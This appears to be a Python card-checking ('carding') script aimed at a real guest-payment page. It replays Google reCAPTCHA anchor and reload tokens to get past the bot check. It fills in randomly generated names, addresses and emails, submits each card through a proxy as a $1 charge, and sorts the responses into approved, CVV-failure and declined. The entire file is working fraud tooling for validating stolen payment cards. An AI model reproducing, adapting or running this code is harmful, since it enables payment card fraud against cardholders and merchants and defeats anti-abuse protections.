import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json 
import names
import platform
import html
import ssl
import certifi
import names
import random_address
import time

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

telephone = f'78{random.randint(1000,9999)}{random.randint(1000,9999)}'
CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"

async def CMDkiCHK(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            mes      = splitter[1]
            ano      = splitter[2]
            cvv      = splitter[3]
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Alt-Used': 'www.google.com',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'iframe',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
            }

            params = {
                'ar': '1',
                'k': '6LfpUIsdAAAAAEK51WYIAR6b9ks5ZSFMs3-JHwvA',
                'co': 'aHR0cHM6Ly9icm9va3BheS5iZnIuY29tOjQ0Mw..',
                'hl': 'es',
                'v': 'Nh10qRQB5k2ucc5SCBLAQ4nA',
                'size': 'invisible',
                'cb': '7zntl8qmo7uo',
            }

            k  = '6LfpUIsdAAAAAEK51WYIAR6b9ks5ZSFMs3-JHwvA'
            co = 'aHR0cHM6Ly9icm9va3BheS5iZnIuY29tOjQ0Mw..'
            v  = 'Nh10qRQB5k2ucc5SCBLAQ4nA'
            chrr = urllib.parse.quote('[82,70,67]')
            bg  = '!W12gXVgKAAQeHRBLbQEHDwMbYEPONRXIXNBFDOad0WfO3qE_N3ZxZuajPpXZZwZoJOHLWtDf2-X3okRVAKoL52i051ZTLATugXEtkzrrMCy0akRoR2Iat0H8jszakG2vuQ71BrNcHrMUNoJjUpz551PnA8LYHp7ARKm4-mkiwhp4NqslbB0wUvffWl3Dh3yNAsr2wTcdFr7aNl-qo4DfUgBPHVk99MdKFjYMZTLVf3u_F5uBW9J22TfkH_kJcEnU86WetK3C5J8CIN4Szpe5cS04gGbJ-ubKCHSNFMHdNQmXftewbRjYTxUc9XbsGGLzfyTBUA0oBSlkE2GgAH94XQX-n06IBbeBB781OD63gApUPQTweRLKDRRCq49bf1aeQ6p1h1UwjnC6NVzjbyw7cM3-O_4wjYXgsRDV36kFrckwoqv6ycW2MQKIuSV4Fb9N583-IK2w4t6SUhjYZpwW_B-fON1zGYu77NEBBN5gUB2qq40HgcEFF5q3mt56j3y8tljd2SLS8wlNRG2nzZM40MWa0JfGrrKOGkFgFsR7D1mwJSk3ZdxPyhv-Db5aMCAB5ySZX0MkzUfwBWf36B2oDktCN2fwgAhDwz7G0j2Na2GovL9reNsvDzPdezmNlqXm11Kp3V6ecyWMT9bHnKImxIYb7mXsaz21aaGSyofWklkiHD0zGA3qPYSBpZM0MN0NA06VCRjrwmgrKvoLu9tjTIbK2s-uJx9WbuuRaG1hx3wgk49mILumyDqYeV052rGegAU9tSFwui-DXxJKm49oG6ZqIdtBlhgdal9760rCOCSZQIBEXWFAnj2tVXCDQ7JRv7FDEM2T5DaBFeI9KnaBznH9r2rPWm8ve80FSb03i-cfk5aCufBBVER6ruDEi_HUY3bvoGlYvbiRotyO78t2UdhcZcxxyyRuKKrTuvJ6tSsgOPC85REHuDjp-frFbsq4KauMuPnMpYra5v1ARLm__GIh38rulCfnBMRQCkPZ2Wy6GoE0Xnkimd7-FCnFN-jZcImFeqU7qEXo2DlkYRfurk7fpLPlcKTpW72xfXkteLMN8zBHuGRCPK4ioTg0nABwj4oV-E_GaIN6mnOTtv528C-sY6sLIoWpFgSGit77-l9l4xn6BGbapKAkd7ZPWin3DfyAp0vLJe3WMwW8jUEcdZGNkWzgqxCXBJUhiFfzKvrAbe69J_xCNsxt_fZRjoSEAOpkalvbOHv3iTEOcdlV4Q'
            vh  = '1068143193'
            
            async with session.get('https://www.google.com/recaptcha/api2/anchor', headers=headers, params=params, proxy=str(proxyrand)) as resp:
                resptext = await resp.text()
                soup = BeautifulSoup(resptext , 'lxml')
                rtk = soup.find("input", {"id": "recaptcha-token"})["value"]

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.google.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfpUIsdAAAAAEK51WYIAR6b9ks5ZSFMs3-JHwvA&co=aHR0cHM6Ly9icm9va3BheS5iZnIuY29tOjQ0Mw..&hl=es&v=Nh10qRQB5k2ucc5SCBLAQ4nA&size=invisible&cb=7zntl8qmo7uo',
                # 'Cookie': '_GRECAPTCHA=09AJBLKW2YbcFW3sXoTuC7oQjDjMY2XOOORB-fCiQuSS6Ze2vV3d14F7Y4QOsXIyj5FmcqebHnmPt1nI2piiAS3uA',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            }

            params = {
                'k': '6LfpUIsdAAAAAEK51WYIAR6b9ks5ZSFMs3-JHwvA',
            }

            data = f'v={v}&reason=q&c={rtk}&k={k}&co={co}&hl=en&size=invisible&chr={chrr}&vh={vh}&bg={bg}'
            async with session.post('https://www.google.com/recaptcha/api2/reload', params=params, headers=headers, data=data, proxy=str(proxyrand)) as resp:
                resptext = await resp.text()
                lines = resptext.split("\n")
                for i in lines:
                    if '"rresp"' in i:
                        sucio = i
                        recaptchatoken = sucio.replace('["rresp","',"").replace('",',"")
                        sub_str = "null"
                        res = recaptchatoken[:recaptchatoken.index(sub_str) + len(sub_str)]
                        res = str(res)
                        recaptchatoken = res.replace('null',"")

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/json; charset=utf-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://brookpay.bfr.com',
                'Connection': 'keep-alive',
                'Referer': 'https://brookpay.bfr.com/guest-payment/',
                # 'Cookie': 'ASP.NET_SessionId=ygvjmtajcgc5crxvo2u4jdr5',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            }

            json_data = {
                'request': {
                    'Type': 1,
                    'CardType': '5',
                    'CardNumber': ccnum,
                    'VerificationNumber': cvv,
                    'ExpirationMonth': mes,
                    'ExpirationYear': ano,
                    'OrderID': f'{first} {random.randint(10000,99999)}',
                    'AddressZip': Zip_Code,
                    'DeliveryZip': Zip_Code,
                    'CustomerName': f'{first} {last}',
                    'AddressStreet1': address,
                    'AddressCity': City,
                    'AddressState': State,
                    'Amount': 1,
                    'ConvenienceFee': 0,
                    'Email': CorreoRand,
                    'Token': f'{recaptchatoken}',
                    'GuestPayment': 'Yes',
                },
            }
            async with session.post('https://brookpay.bfr.com/svc/BrookPay.asmx/CustomerRequest', headers=headers, json=json_data, proxy=str(proxyrand), timeout=15) as resp:
                try :          
                    response = await resp.text()
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 

            if int(response.find('"procStatusMessage":"Approved"')) > 0 :
                try :
                    jsonresponse = await resp.json()
                    hostCVVRespCode = jsonresponse['d']['RawResponse']['hostCVVRespCode']
                    hostAVSRespCode = jsonresponse['d']['RawResponse']['hostAVSRespCode']
                    procStatusMessage = jsonresponse['d']['RawResponse']['procStatusMessage']
                    await session.close()
                    return "Approved", "Charged 1$", hostAVSRespCode, hostCVVRespCode
                except (KeyError):
                    jsonresponse = await resp.json()
                    procStatusMessage = jsonresponse['d']['RawResponse']['procStatusMessage']
                    await session.close()
                    return "ApprovedSinCVV", "Charged 1$"
            elif int(response.find('CVD ERROR')) > 0 :
                try :
                    jsonresponse = await resp.json()
                    hostCVVRespCode = jsonresponse['d']['RawResponse']['hostCVVRespCode']
                    hostAVSRespCode = jsonresponse['d']['RawResponse']['hostAVSRespCode']
                    procStatusMessage = jsonresponse['d']['RawResponse']['procStatusMessage']
                    respCode = jsonresponse['d']['RawResponse']['respCode']
                    await session.close()
                    return "Approved", f"{respCode} CVV2/CVC2 Failure", hostAVSRespCode, hostCVVRespCode
                except (KeyError):
                    jsonresponse = await resp.json()
                    procStatusMessage = jsonresponse['d']['RawResponse']['procStatusMessage']
                    respCode = jsonresponse['d']['RawResponse']['respCode']
                    await session.close()
                    return "ApprovedSinCVV", f"{respCode} CVV2/CVC2 Failure"
            elif int(response.find('"procStatusMessage"')) > 0 :
                try :
                    jsonresponse = await resp.json()
                    hostCVVRespCode = jsonresponse['d']['RawResponse']['hostCVVRespCode']
                    hostAVSRespCode = jsonresponse['d']['RawResponse']['hostAVSRespCode']
                    procStatusMessage = jsonresponse['d']['RawResponse']['procStatusMessage']
                    respCode = jsonresponse['d']['RawResponse']['respCode']
                    await session.close()
                    return "Declined", f"{respCode} {procStatusMessage}", hostAVSRespCode, hostCVVRespCode
                except (KeyError):
                    jsonresponse = await resp.json()
                    procStatusMessage = jsonresponse['d']['RawResponse']['procStatusMessage']
                    respCode = jsonresponse['d']['RawResponse']['respCode']
                    await session.close()
                    return "DeclinedSinCVV", f"{respCode} {procStatusMessage}"
            else :
                await session.close()
                print(response)
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. ServerDisconnectedError. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. ClientConnectorError. ♻️"


